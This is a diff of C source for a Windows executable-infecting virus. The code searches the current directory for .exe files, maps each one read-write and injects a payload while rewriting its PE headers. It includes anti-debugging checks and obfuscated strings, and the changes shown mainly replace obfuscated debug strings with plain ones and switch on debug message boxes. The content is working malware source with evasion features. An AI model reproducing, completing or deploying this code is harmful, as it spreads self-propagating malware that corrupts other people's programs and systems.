@@ -17,10 +17,11 @@ EXTERN_C_END
 INJECTED_CODE VOID inj_code_c() {
 #ifndef NO_ANTIDBG
     if (being_debugged()) {
-        // If we're being debugged, do not run the payload, just run the program normally
         // __debugbreak();
         // __fastfail(FAST_FAIL_FATAL_APP_EXIT);
         // ((PVOID(*)())NULL)();
+
+        // If we're being debugged, do not run the payload, just run the program normally
         return;
     }
 #endif  // NO_ANTIDBG
@@ -32,13 +33,15 @@ INJECTED_CODE VOID inj_code_c() {
     DECLARE_OBFUSCATED(exeExt, "*.exe");            // File extension to search for
 #ifdef PL_DEBUG
     // Declarations for debug strings
-    DECLARE_OBFUSCATED(mbInjecting, "Injecting...");
-    // DECLARE_OBFUSCATED(errGetModName, "Error getting module name");
-    // DECLARE_OBFUSCATED(errGetDir, "Error getting current directory");
-    DECLARE_OBFUSCATED(errFindFile, "No .exe files");
-    // DECLARE_OBFUSCATED(errOpenFile, "Error opening file");
-    // DECLARE_OBFUSCATED(errMapFile, "Error mapping file");
-    // DECLARE_OBFUSCATED(errNotPE, "Not a PE x64 file");
+    INJECTED_VAR static CONST CHAR mbModuleName[] = "Current module name";
+    INJECTED_VAR static CONST CHAR mbInjecting[] = "Injecting...";
+    INJECTED_VAR static CONST CHAR mbSkipping[] = "Skipping file";
+    INJECTED_VAR static CONST CHAR errGetModName[] = "Error getting module name";
+    INJECTED_VAR static CONST CHAR errGetDir[] = "Error getting current directory";
+    INJECTED_VAR static CONST CHAR errFindFile[] = "No .exe files";
+    INJECTED_VAR static CONST CHAR errOpenFile[] = "Error opening file";
+    INJECTED_VAR static CONST CHAR errMapFile[] = "Error mapping file";
+    INJECTED_VAR static CONST CHAR errNotPE[] = "Not a PE x64 file";
 #endif  // PL_DEBUG
 
     // Get module handles and function pointers
@@ -68,16 +71,16 @@ INJECTED_CODE VOID inj_code_c() {
     CHAR sModuleName[MAX_PATH];  // Buffer for the module name
     DWORD res = pGetModuleFileNameA(NULL, sModuleName, sizeof(sModuleName));
     if (res == 0 || res >= sizeof(sModuleName)) {
-        // MSGBOX_DBG(DEOBF(errGetModName), NULL, MB_OK | MB_ICONERROR);
+        MSGBOX_DBG(errGetModName, NULL, MB_OK | MB_ICONERROR);
         goto end;
     }
-    // MSGBOX_DBG(sModuleName, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);
+    MSGBOX_DBG(sModuleName, mbModuleName, MB_OK | MB_ICONINFORMATION);
 
     CHAR sDirName[MAX_PATH];   // Buffer for the directory name
     CHAR sFindPath[MAX_PATH];  // Buffer for the search path
     res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
     if (res == 0 || res >= sizeof(sDirName) - DEOBF(exeExt).length - 1) {
-        // MSGBOX_DBG(DEOBF(errGetDir), NULL, MB_OK | MB_ICONERROR);
+        MSGBOX_DBG(errGetDir, NULL, MB_OK | MB_ICONERROR);
         goto end;
     }
     // Append a backslash to the current directory name
@@ -92,7 +95,7 @@ INJECTED_CODE VOID inj_code_c() {
     WIN32_FIND_DATAA findData;  // Structure to hold file search results
     hFind = pFindFirstFileA(sFindPath, &findData);
     if (hFind == INVALID_HANDLE_VALUE) {
-        MSGBOX_DBG(DEOBF(errFindFile), NULL, MB_OK | MB_ICONERROR);
+        MSGBOX_DBG(errFindFile, NULL, MB_OK | MB_ICONERROR);
         goto end;
     }
 
@@ -122,15 +125,15 @@ INJECTED_CODE VOID inj_code_c() {
             || sDirEnd[0] != '!'  // Skip file names not starting with '!' if `NEED_BANG` is defined
 #endif                            // NEED_BANG
         ) {
-            MSGBOX_DBG(sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONWARNING);
+            MSGBOX_DBG(sFilePath, mbSkipping, MB_OK | MB_ICONWARNING);
             continue;
         }
-        MSGBOX_DBG(sFilePath, DEOBF(mbInjecting), MB_OK | MB_ICONINFORMATION);
+        MSGBOX_DBG(sFilePath, mbInjecting, MB_OK | MB_ICONINFORMATION);
 
         hFile = pCreateFileA(sFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) {
-            // MSGBOX_DBG(DEOBF(errOpenFile), NULL, MB_OK | MB_ICONERROR);
+            MSGBOX_DBG(errOpenFile, NULL, MB_OK | MB_ICONERROR);
             continue;
         }
 
@@ -141,13 +144,13 @@ INJECTED_CODE VOID inj_code_c() {
 
         hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, dwFileSize, NULL);
         if (hMapFile == NULL) {
-            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
+            MSGBOX_DBG(errMapFile, NULL, MB_OK | MB_ICONERROR);
             goto close_file;
         }
 
         pMapAddress = pMapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
         if (pMapAddress == NULL) {
-            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
+            MSGBOX_DBG(errMapFile, NULL, MB_OK | MB_ICONERROR);
             goto close_map;
         }
 
@@ -202,13 +205,13 @@ INJECTED_CODE VOID inj_code_c() {
         // Remap the file in read-write mode to inject the payload and update the headers
         hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwNewFileSize, NULL);
         if (hMapFile == NULL) {
-            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
+            MSGBOX_DBG(errMapFile, NULL, MB_OK | MB_ICONERROR);
             goto close_file;
         }
 
         pMapAddress = pMapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
         if (pMapAddress == NULL) {
-            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
+            MSGBOX_DBG(errMapFile, NULL, MB_OK | MB_ICONERROR);
             goto close_map;
         }
 
